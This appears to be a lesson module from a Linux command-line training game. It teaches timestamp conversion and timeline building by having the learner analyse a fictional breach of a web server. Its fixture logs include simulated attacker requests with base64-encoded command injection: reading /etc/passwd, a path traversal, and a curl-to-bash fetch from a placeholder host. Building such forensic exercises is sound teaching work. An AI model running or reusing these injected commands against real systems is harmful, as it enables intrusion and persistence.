import { defineFixture } from '../fixtures';
import { GID, home, homeDir, put } from '../fixtures/base';
import { accessLog, apacheTime, STORY_END } from '../fixtures/gen';
import type { Mission } from '../types';
import { ATTACK_LOG } from './day14';

const UA_FIREFOX = 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0';

/** One Apache combined-format line, for hand-placed events. */
export function webHit(ip: string, t: number, method: string, path: string, status: number, size: number, ua = UA_FIREFOX) {
  return { t, line: `${ip} - - [${apacheTime(t)}] "${method} ${path} HTTP/1.1" ${status} ${size} "-" "${ua}"` };
}

const mar = (d: number, h: number, m: number, s: number) => Date.UTC(2026, 2, d, h, m, s);

/** What 198.51.100.23 did on web01's customer portal after the SSH login at 23:51. */
const BREACH_WEB = [
  webHit('198.51.100.23', mar(13, 23, 52, 40), 'GET', '/portal/login', 200, 4211),
  webHit('198.51.100.23', mar(13, 23, 53, 5), 'POST', '/portal/login', 302, 0),
  webHit('198.51.100.23', mar(13, 23, 53, 7), 'GET', '/portal/', 200, 9120),
  webHit('198.51.100.23', mar(13, 23, 54, 31), 'GET', '/portal/reports', 200, 15544),
  webHit('198.51.100.23', mar(13, 23, 55, 9), 'GET', '/portal/export?table=customers', 200, 48213),
  webHit('198.51.100.23', mar(13, 23, 58, 10), 'GET', '/portal/admin', 403, 199),
  webHit('198.51.100.23', mar(13, 23, 58, 44), 'GET', '/portal/admin/users', 403, 199),
  webHit('198.51.100.23', mar(14, 0, 3, 12), 'GET', '/portal/export?table=invoices', 200, 131072),
  webHit('198.51.100.23', mar(14, 0, 11, 37), 'GET', '/portal/settings/api-keys', 403, 199),
  webHit('198.51.100.23', mar(14, 0, 24, 58), 'GET', '/portal/logout', 302, 0),
];

/**
 * In the same minutes, a script on the same address drove the forgotten /cgi-bin/diag.cgi with base64 in cmd=
 * (Case 4 decodes these). Only artifacts: every payload is encoded without a trailing newline and never executed.
 */
const UA_SCRIPT = 'python-requests/2.31.0';
const diag = (t: number, query: string, status: number, size: number) => webHit('198.51.100.23', t, 'GET', `/cgi-bin/diag.cgi${query}`, status, size, UA_SCRIPT);
const DIAG_WEB = [
  diag(mar(13, 23, 57, 52), '', 200, 341), // the bare page: recon, no payload
  diag(mar(13, 23, 58, 23), '?cmd=aWQ=', 200, 52), // id
  diag(mar(13, 23, 58, 51), '?cmd=dW5hbWUgLWE=', 200, 118), // uname -a
  diag(mar(14, 0, 2, 41), '?cmd=Y2F0IC9ldGMvcGFzc3dk', 200, 1873), // cat /etc/passwd
  diag(mar(14, 0, 12, 20), '?cmd=..%2f..%2fetc%2fpasswd', 500, 612), // path traversal, not base64
  diag(mar(14, 0, 30, 17), '?cmd=Y3VybCAtcyBodHRwOi8vMTk4LjUxLjEwMC43Ny91LnNoIHwgYmFzaA==&t=1', 200, 0), // curl … | bash: plants the cron job
];

/** web01's access log from Friday evening to Saturday noon: the attacker's portal visit and its diag.cgi commands. */
export const WEB01_ACCESS_LOG = accessLog({ seed: 17, start: mar(13, 20, 0, 0), end: mar(14, 12, 0, 0), normal: 160, extra: [...BREACH_WEB, ...DIAG_WEB] });

/** The customer portal's own log (ISO timestamps). */
const APP_LOG = `2026-03-12 16:02:37 INFO portal: user raj logged in from 10.20.0.12
2026-03-12 16:05:12 INFO portal: user raj exported tickets.csv (58 rows)
2026-03-12 16:40:55 INFO portal: user raj logged out
2026-03-13 09:15:20 INFO portal: user raj logged in from 10.20.0.12
2026-03-13 09:47:03 INFO portal: user raj logged out
2026-03-13 21:58:02 INFO portal: user mara logged in from 10.20.0.8
2026-03-13 22:04:51 INFO portal: user mara exported invoices.csv (37 rows)
2026-03-13 22:10:15 INFO portal: user mara logged out
2026-03-13 23:00:00 INFO portal: health check ok
2026-03-13 23:53:05 INFO portal: user raj logged in from 198.51.100.23
2026-03-13 23:55:10 INFO portal: user raj exported customers.csv (412 rows)
2026-03-13 23:58:10 WARN portal: user raj denied access to /portal/admin
2026-03-13 23:58:44 WARN portal: user raj denied access to /portal/admin/users
2026-03-14 00:00:00 INFO portal: health check ok
2026-03-14 00:03:13 INFO portal: user raj exported invoices.csv (1208 rows)
2026-03-14 00:11:37 WARN portal: user raj denied access to /portal/settings/api-keys
2026-03-14 00:24:58 INFO portal: user raj logged out
2026-03-14 01:00:00 INFO portal: health check ok
2026-03-14 02:00:03 INFO portal: nightly backup finished (3 tables)
2026-03-14 07:41:19 INFO portal: user mara logged in from 10.20.0.8
2026-03-14 07:44:02 WARN portal: user mara ended all sessions for user raj
2026-03-14 07:44:30 INFO portal: user mara logged out
`;

defineFixture('day17', (vfs) => {
  put(vfs, '/var/log/auth.log', ATTACK_LOG, { mode: 0o640, uid: 104, gid: 4, mtime: STORY_END });
  put(vfs, '/var/log/apache2/access.log', WEB01_ACCESS_LOG, { mode: 0o640, gid: GID.adm, mtime: STORY_END });
  home(vfs, 'evidence/app.log', APP_LOG, 0o644, STORY_END);
  homeDir(vfs, 'cases');
});

const SSH_LOOP = `grep "198.51.100.23 " /var/log/auth.log | tail -4 |
while read -r mon day clock rest; do
  echo "$(date -d "$mon $day $clock 2026" '+%F %T') \${rest#*: }"
done > ~/evidence/ssh.txt`;
/** What SSH_LOOP writes into ~/evidence/ssh.txt. */
const SSH_TXT = `2026-03-13 23:45:43 Failed password for invalid user admin from 198.51.100.23 port 33635 ssh2
2026-03-13 23:47:09 Failed password for root from 198.51.100.23 port 45149 ssh2
2026-03-13 23:48:36 Failed password for raj from 198.51.100.23 port 39390 ssh2
2026-03-13 23:51:00 Accepted password for raj from 198.51.100.23 port 39615 ssh2
`;
const WINDOW = `awk '$0 >= "2026-03-13 23:50" && $0 < "2026-03-14 00:30"'`;

export const day17: Mission = {
  day: 17,
  week: 3,
  title: 'Timeline',
  topic: 'Dates, time windows & event timelines',
  minutes: 45,
  fixture: 'day17',
  caseId: 'timeline',
  briefing: `The incident report on the web01 breach goes to management this week, and they’ve asked for one thing above all: **a minute-by-minute account**. When did \`198.51.100.23\` start? When did it get in as raj? What did it do on the website once it was inside?

The answers are spread over three logs, and each one keeps time its own way. \`auth.log\` writes \`Mar 13 23:51:00\`, with no year. Apache writes \`[13/Mar/2026:23:52:40 +0000]\`. The portal’s \`app.log\` writes \`2026-03-13 23:53:05\`. Paste them into one file and \`sort\` it, and you get nonsense.

Today you make time behave: turn any stamp into **epoch seconds** for arithmetic and into **ISO** for sorting, cut a time window out of a log, and merge sources into one timeline. Then Case 5 builds the whole report in one command.`,
  objectives: ['Convert timestamps to epoch seconds and back with `date`', 'Normalise syslog and Apache stamps into ISO', 'Measure the gap between two events with `$(( ))`', 'Filter a time window and merge logs into one sorted timeline'],
  lesson: [
    {
      kind: 'read',
      id: 'epoch',
      title: 'One clock: epoch seconds',
      md: `Computers count time as **seconds since 1970-01-01 00:00:00 UTC**, the Unix *epoch*. \`date +%s\` prints that count for right now.

As text, \`23:52\` and \`00:24\` can’t be subtracted. As epoch seconds they’re just two numbers: subtract them for the gap, compare them with \`-lt\` for the order, and midnight stops being a problem.

\`date -d STRING\` describes the moment you give it instead of now, and \`+FORMAT\` chooses what to print:

| Format | Prints |
|---|---|
| \`+%s\` | \`1773445860\` (epoch seconds) |
| \`'+%F %T'\` | \`2026-03-13 23:51:00\` (ISO date and time) |
| \`+%A\` | \`Friday\` |

Quote \`'+%F %T'\`: without the quotes, the space would split it into two arguments. Halden’s servers and this terminal run on UTC; on a machine set to another time zone, add \`-u\` so \`date\` reads and prints UTC.`,
    },
    {
      kind: 'task',
      id: 'to-epoch',
      md: 'The SSH login as raj happened at `2026-03-13 23:51:00`. Print that moment in **epoch seconds**.',
      check: { output: '1773445860\n', uses: ['date'] },
      solution: 'date -d "2026-03-13 23:51:00" +%s',
      hints: ['`date -d "WHEN" +FORMAT`, with the format that prints epoch seconds.', '`date -d "2026-03-13 23:51:00" +%s`'],
      explain: 'One number for one exact second. You can store it, subtract it and compare it, and it means the same thing on every machine that reads it.',
    },
    {
      kind: 'task',
      id: 'from-epoch',
      md: 'Now the other way. `date -u -d @EPOCH` reads epoch seconds (the `@` says “this is an epoch number”), and `-u` prints the result in UTC.\n\nThe helpdesk system stamped Raj’s password reset `1773472980`. Print it as `YYYY-MM-DD HH:MM:SS`.',
      check: { output: '2026-03-14 07:23:00\n', uses: ['date'] },
      solution: "date -u -d @1773472980 '+%F %T'",
      hints: ["`date -u -d @NUMBER '+%F %T'`", "`date -u -d @1773472980 '+%F %T'`"],
      explain: 'Saturday, 07:23: seven and a half hours after the login. Until that reset, the attacker held a working password. Firewall exports, cloud audit trails and databases love epoch stamps, so you’ll make this conversion often.',
    },
    {
      kind: 'read',
      id: 'formats',
      title: 'What date -d understands',
      md: `\`date -d\` reads many formats, but not every log’s:

| Input | Accepted? |
|---|---|
| \`2026-03-13 23:51:00\` | yes: ISO |
| \`Mar 13 23:51:00 2026\` | yes: a syslog stamp **with the year added** |
| \`13 Mar 2026 23:58:10\` | yes |
| \`13/Mar/2026:23:58:10\` | **no**: “invalid date” |

**Syslog stamps have no year.** Given \`Mar 13 23:51:00\`, \`date\` quietly assumes the current year, which is wrong as soon as the log comes from an earlier one. These logs are all from **2026**, so add it yourself:

\`\`\`bash
date -d "Mar 13 23:51:00 2026" '+%F %T'    # 2026-03-13 23:51:00
\`\`\`

In an \`auth.log\` line, the stamp is the first three fields: \`awk '{print $1, $2, $3}'\`.`,
    },
    {
      kind: 'task',
      id: 'syslog-iso',
      md: 'Save the stamp of the `Accepted password` line in `/var/log/auth.log` in a variable `stamp`, then print it in ISO, with the year added.',
      check: { output: '2026-03-13 23:51:00\n', uses: ['date'], vars: { stamp: 'Mar 13 23:51:00' } },
      solution: `stamp=$(grep "Accepted password" /var/log/auth.log | awk '{print $1, $2, $3}'); date -d "$stamp 2026" '+%F %T'`,
      hints: ['Two steps: capture the stamp with `$( )`, then hand it to `date -d`.', `\`stamp=$(grep "Accepted password" /var/log/auth.log | awk '{print $1, $2, $3}')\``, `Then \`date -d "$stamp 2026" '+%F %T'\`.`],
      explain: 'One syslog line in, one ISO stamp out. Run the same conversion in a loop over every line of a log and you have half of Case 5.',
    },
    {
      kind: 'quiz',
      id: 'q-year',
      q: 'It’s January 2027. You run `date -d "Mar 13 23:51:00" +%F` on a syslog stamp from last March. What do you get?',
      options: ['2026-03-13', '2027-03-13', 'An error: the year is missing', '1970-03-13'],
      answer: 1,
      explain: '`date` fills in the current year without a word of warning, so the event jumps a year into the future. Your timeline would put the breach after the report about it. Always add the year yourself.',
    },
    {
      kind: 'read',
      id: 'apache',
      title: 'Apache’s slashes',
      md: `Apache writes \`[13/Mar/2026:23:52:40 +0000]\`, and \`date -d\` rejects it. Three cuts with Day 15’s string tricks fix it:

\`\`\`bash
s='[13/Mar/2026:23:52:40'   # field 4 of an access.log line
s=\${s:1}                    # 13/Mar/2026:23:52:40   drop the [
s=\${s/:/ }                  # 13/Mar/2026 23:52:40   first : becomes a space
s=\${s//\\// }                # 13 Mar 2026 23:52:40   every / becomes a space
date -d "$s" '+%F %T'       # 2026-03-13 23:52:40
\`\`\`

\`\${s:1}\` is the substring from position 1, so everything but the first character. In \`\${s//\\// }\` the backslash marks the middle \`/\` as the character to find, not as a separator. The same job in sed is \`sed 's/\\[//; s/:/ /; s/\\// /g'\`.

The \`+0000\` sits in field 5, and you can leave it there: it says these servers log in UTC.`,
    },
    {
      kind: 'widget',
      id: 'w-apache',
      md: 'Each word applies one cut to the same `s`. Edit the line: try `${s:1:11}`, or change `//` to `/`.',
      widget: 'expansion',
      props: { setup: "s='[13/Mar/2026:23:52:40'", line: 'echo "${s:1}" "${s/:/ }" "${s//\\// }"' },
    },
    {
      kind: 'task',
      id: 'apache-iso',
      md: 'Now on the real log. Take the **first** request from `198.51.100.23` in `/var/log/apache2/access.log`, put its field 4 in `s`, make the three cuts and print the time in ISO.',
      check: { output: '2026-03-13 23:52:40\n', uses: ['date'], vars: { s: '13 Mar 2026 23:52:40' } },
      solution: `s=$(grep "^198.51.100.23 " /var/log/apache2/access.log | head -1 | awk '{print $4}'); s=\${s:1}; s=\${s/:/ }; s=\${s//\\// }; date -d "$s" '+%F %T'`,
      hints: [
        `\`s=$(grep "^198.51.100.23 " /var/log/apache2/access.log | head -1 | awk '{print $4}')\``,
        'Then `s=${s:1}; s=${s/:/ }; s=${s//\\// }`',
        `Finish with \`date -d "$s" '+%F %T'\`.`,
      ],
      explain: '23:52:40: one minute and forty seconds after the SSH login, the same address opened the customer portal’s login page. Two logs, one story, and now they’re on the same clock.',
    },
    {
      kind: 'task',
      id: 'gap',
      md: 'With both moments in epoch seconds, a gap is one subtraction: `a=$(date -d "…" +%s)`, `b=$(date -d "…" +%s)`, then `echo $(( (b - a) / 60 ))` for whole minutes. `$(( ))` only does whole numbers, so the leftover seconds are dropped.\n\nThe first attempt from `198.51.100.23` was logged at `Mar 13 23:05:00`, the successful login at `Mar 13 23:51:00`. How many minutes did the attacker need?',
      check: { output: '46\n', nodes: ['arith'] },
      solution: 'a=$(date -d "Mar 13 23:05:00 2026" +%s); b=$(date -d "Mar 13 23:51:00 2026" +%s); echo $(( (b - a) / 60 ))',
      hints: ['Add the year: `date -d "Mar 13 23:05:00 2026" +%s`.', 'Save each one with `a=$( … )` and `b=$( … )`, then `echo $(( (b - a) / 60 ))`.'],
      explain: '46 minutes and 31 failed passwords, and nobody saw it. That number goes in the report as the detection gap, and it’s the reason Case 3’s detector now runs from cron.',
    },
    {
      kind: 'predict',
      id: 'p-sort',
      md: 'Three dates the way Apache writes them, day first. What does this print?',
      code: "printf '14/Feb/2026\\n13/Mar/2026\\n02/Apr/2026\\n' | sort | head -1",
      options: ['14/Feb/2026', '02/Apr/2026', '13/Mar/2026', 'An error'],
      answer: 1,
      explain: '`sort` compares text one character at a time, and `0` comes before `1`, so the **latest** date sorts first. Any stamp that starts with the day or a month name sorts wrong.',
    },
    {
      kind: 'read',
      id: 'iso',
      title: 'Why ISO wins',
      md: `ISO puts the **biggest unit first** and gives every part a fixed width: \`2026-03-13 23:51:00\`. Compare two ISO stamps character by character and the first difference is always the most important one. So for ISO, and only ISO:

- plain \`sort\` puts lines in time order;
- comparing the text answers “before or after?”.

awk compares strings when you give it a string, so a **time window** is one condition. When the stamp starts the line, compare the whole line, \`$0\`:

\`\`\`bash
${WINDOW} ~/evidence/app.log
\`\`\`

A shorter bound works like a prefix: every line from 23:50:00 on is \`>= "2026-03-13 23:50"\`. Use \`>=\` for the start and \`<\` for the end, and windows that touch never count a line twice.`,
    },
    {
      kind: 'task',
      id: 'window',
      md: 'The portal log has raj in it on three different days. Show only the `user raj` lines from **23:50 on the 13th** up to **00:30 on the 14th**.',
      check: { output: 'reference', uses: ['awk'] },
      solution: `grep "user raj" ~/evidence/app.log | ${WINDOW}`,
      hints: ['Start with `grep "user raj" ~/evidence/app.log`.', `Then add \`| ${WINDOW}\`.`],
      explain: 'Same username, different person. On the 12th and the morning of the 13th, raj logged in from `10.20.0.12`, his own desk. Inside the window it’s `198.51.100.23`: it exported `customers.csv` (412 rows) and `invoices.csv` (1208 rows), and was refused three pages it had no right to. The window is what separates Raj from the attacker using his name.',
    },
    {
      kind: 'task',
      id: 'ssh-iso',
      md: `Now a whole batch. This loop converts the attacker’s **last four** auth.log lines to ISO and keeps only the message after \`sshd[PID]: \`. \`read\` splits off the first three words, and \`\${rest#*: }\` cuts everything up to the first \`: \`.

\`\`\`bash
${SSH_LOOP}
\`\`\`

Run it. It prints nothing, because \`>\` sends the loop’s output into the file. Then \`cat ~/evidence/ssh.txt\` to read it.`,
      check: { fs: [{ path: '~/evidence/ssh.txt', content: SSH_TXT }] },
      solution: `${SSH_LOOP}\ncat ~/evidence/ssh.txt`,
      hints: ['Type the loop as shown. The terminal waits for `done` before it runs anything.', 'The loop writes into the file, so the screen stays empty. `cat ~/evidence/ssh.txt` shows what it wrote.'],
      explain: 'Four auth.log lines, now on the same clock as the portal log. The last one is the moment it all went wrong: `23:51:00 Accepted password for raj`.',
    },
    {
      kind: 'task',
      id: 'merge',
      md: 'Last step: one timeline. **Braces** group commands so their output flows into one pipe, as if it came from a single file:\n\n```bash\n{ command1; command2; } | sort\n```\n\nPut spaces inside the braces and a `;` before the `}`. (Day 13 used the same trick with `> file`.)\n\nMerge `~/evidence/ssh.txt` with the portal’s `user raj` lines, sort them, and keep the window from **23:45** on the 13th up to **00:30** on the 14th.',
      check: { output: 'reference', uses: ['sort'] },
      solution: `{ cat ~/evidence/ssh.txt; grep "user raj" ~/evidence/app.log; } | sort | awk '$0 >= "2026-03-13 23:45" && $0 < "2026-03-14 00:30"'`,
      hints: ['`{ cat ~/evidence/ssh.txt; grep "user raj" ~/evidence/app.log; } | sort`', `Then the window: \`| awk '$0 >= "2026-03-13 23:45" && $0 < "2026-03-14 00:30"'\`.`],
      explain: 'Eleven lines, and the portal’s side of the night reads like a story: three failures, the SSH login at 23:51:00, the portal login two minutes later with the same stolen password, the customer export at 23:55, two refused admin pages, a second export, a refused API-keys page, and logout at 00:24:58. The portal never saw the rest. The access log also holds the `diag.cgi` requests from Case 4, ending at 00:30:17 with the `curl … | bash` that planted the root cron job. Case 5 merges every SSH line and every web request, automatically.',
    },
    {
      kind: 'fill',
      id: 'f-epoch',
      md: 'Complete: read an epoch number, then turn a gap in seconds into whole minutes.',
      template: "date -u -d ___1773472980 '+%F %T'\necho $(( (b - a) / ___ ))",
      answers: [['@'], ['60']],
      explain: '`@` tells `date -d` the number is epoch seconds. Dividing seconds by 60 gives minutes, and `$(( ))` drops the remainder.',
    },
  ],
  drills: [
    {
      kind: 'task',
      id: 'd-weekday',
      md: '**Drill 1.** Management will ask *when* in plain words. Print the login moment `2026-03-13 23:51:00` as weekday and time, like `Friday 23:51`.',
      check: { output: 'Friday 23:51\n', uses: ['date'] },
      solution: `date -d "2026-03-13 23:51:00" '+%A %H:%M'`,
      hints: ['`%A` is the weekday; `%H:%M` is hours and minutes.', `\`date -d "2026-03-13 23:51:00" '+%A %H:%M'\``],
      explain: 'Friday, just before midnight, at the start of a weekend. Attackers know when nobody is watching. The weekday belongs in the report: it explains why nobody noticed until Saturday morning.',
    },
    {
      kind: 'task',
      id: 'd-onsite',
      md: '**Drill 2.** How long was the attacker busy on web01’s website? Its first web request was stamped `[13/Mar/2026:23:52:40` and its last `[14/Mar/2026:00:30:17`. Print the whole minutes between them.',
      check: { output: '37\n', nodes: ['arith'] },
      solution: 'a=$(date -d "13 Mar 2026 23:52:40" +%s); b=$(date -d "14 Mar 2026 00:30:17" +%s); echo $(( (b - a) / 60 ))',
      hints: ['Rewrite both stamps in a form `date` accepts: `13 Mar 2026 23:52:40`.', 'Epoch seconds for both, then `echo $(( (b - a) / 60 ))`.'],
      explain: '37 minutes, across midnight, from the portal’s login page to the request that planted the cron job. Try it with the clock times as text and `00:30` minus `23:52` comes out negative. Epoch seconds don’t care what day it is.',
    },
    {
      kind: 'task',
      id: 'd-denied',
      md: '**Drill 3.** Which pages was the attacker refused? Print every `403` request from `198.51.100.23` as `ISO-TIME PATH`, one per line.',
      check: { output: 'reference', nodes: ['while'] },
      solution: `grep "^198.51.100.23 " /var/log/apache2/access.log | awk '$9 == 403 {print $4, $7}' | while read -r s path; do s=\${s:1}; s=\${s/:/ }; echo "$(date -d "\${s//\\// }" '+%F %T') $path"; done`,
      hints: [
        "`awk '$9 == 403 {print $4, $7}'` gives the stamp and the path.",
        'Loop with `while read -r s path; do …; done` and make the three cuts on `s`.',
        `Once \`s\` is fixed: \`echo "$(date -d "$s" '+%F %T') $path"\`.`,
      ],
      explain: 'Admin pages, user management, API keys: the attacker went looking for more power and a way back in. All three were refused, and it didn’t matter. In the same minutes, the same address was sending commands through `/cgi-bin/diag.cgi` (Case 4), and the last of them planted the root cron job that outlived Raj’s password reset. Note `/portal/settings/api-keys` in the report anyway: a stolen API key would have been one more way back in.',
    },
    {
      kind: 'task',
      id: 'd-later',
      md: '**Drill 4.** Epoch arithmetic works forwards too: add seconds, then convert back. Print the moment **15 minutes after** the SSH login (`2026-03-13 23:51:00`) in ISO.',
      check: { output: '2026-03-14 00:06:00\n', uses: ['date'] },
      solution: `t=$(date -d "2026-03-13 23:51:00" +%s); date -u -d @$(( t + 15 * 60 )) '+%F %T'`,
      hints: ['Epoch first: `t=$(date -d "2026-03-13 23:51:00" +%s)`.', `Then \`date -u -d @$(( t + 15 * 60 )) '+%F %T'\`.`],
      explain: 'The date rolled over to the 14th by itself. This is how you build a window around any event, like the first 15 minutes after a login or an hour either side of an alert: work out the edges in epoch seconds, print them as ISO, and hand them to awk.',
    },
  ],
  debrief: {
    summary: [
      '`date +%s` prints the current time in epoch seconds. `date -d "2026-03-13 23:51:00" +%s` converts a given moment, and `date -u -d @EPOCH \'+%F %T\'` converts back.',
      'Syslog stamps have no year, so add it: `"Mar 13 23:51:00 2026"`. Apache stamps need three cuts first: `${s:1}`, `${s/:/ }`, `${s//\\// }`.',
      'A gap is a subtraction of epoch seconds: `$(( (b - a) / 60 ))` minutes, even across midnight.',
      'ISO stamps sort and compare correctly as text: `sort` for order, `awk \'$0 >= "…" && $0 < "…"\'` for a window.',
      '`{ cmd1; cmd2; } | sort` merges sources into one timeline. Case 5 is open: the Incident Timeline.',
    ],
    cards: ['c-d17-epoch', 'c-d17-toepoch', 'c-d17-fromepoch', 'c-d17-syslogyear', 'c-d17-apache', 'c-d17-gap', 'c-d17-isosort', 'c-d17-window', 'c-d17-group', 'c-d17-weekday'],
  },
  cards: [
    { id: 'c-d17-epoch', day: 17, tag: 'time', front: 'What are epoch seconds, and how do you print them for right now?', back: 'Seconds since 1970-01-01 00:00:00 UTC. `date +%s`' },
    { id: 'c-d17-toepoch', day: 17, tag: 'time', front: 'Convert `2026-03-13 23:51:00` to epoch seconds?', back: '`date -d "2026-03-13 23:51:00" +%s`' },
    { id: 'c-d17-fromepoch', day: 17, tag: 'time', front: 'Turn epoch `1773472980` back into a readable UTC time?', back: "`date -u -d @1773472980 '+%F %T'` — the `@` marks an epoch number." },
    { id: 'c-d17-syslogyear', day: 17, tag: 'time', front: 'A syslog stamp says `Mar 13 23:51:00`. How do you convert it safely?', back: "Add the year yourself: `date -d \"Mar 13 23:51:00 2026\" '+%F %T'`. Without it, `date` assumes the current year." },
    { id: 'c-d17-apache', day: 17, tag: 'time', front: '`date -d` rejects Apache’s `[13/Mar/2026:23:58:10`. How do you fix the stamp?', back: '`s=${s:1}; s=${s/:/ }; s=${s//\\// }` gives `13 Mar 2026 23:58:10`, which `date -d` accepts.' },
    { id: 'c-d17-gap', day: 17, tag: 'time', front: 'Whole minutes between two events?', back: 'Convert both to epoch seconds (`+%s`), then `echo $(( (b - a) / 60 ))`. Works across midnight.' },
    { id: 'c-d17-isosort', day: 17, tag: 'time', front: 'Why normalise every timestamp to ISO (`2026-03-13 23:51:00`)?', back: 'Biggest unit first, fixed width: ISO stamps sort and compare correctly as plain text. Syslog and Apache stamps don’t.' },
    { id: 'c-d17-window', day: 17, tag: 'time', front: 'Lines of an ISO log from 23:50 up to (not including) 00:30 the next day?', back: "`awk '$0 >= \"2026-03-13 23:50\" && $0 < \"2026-03-14 00:30\"' app.log`" },
    { id: 'c-d17-group', day: 17, tag: 'pipes', front: 'Merge the output of two commands into one sorted stream?', back: '`{ cmd1; cmd2; } | sort` — spaces inside the braces, `;` before the `}`.' },
    { id: 'c-d17-weekday', day: 17, tag: 'time', front: 'Day of the week for a date?', back: '`date -d 2026-03-13 +%A` prints `Friday`.' },
  ],
};
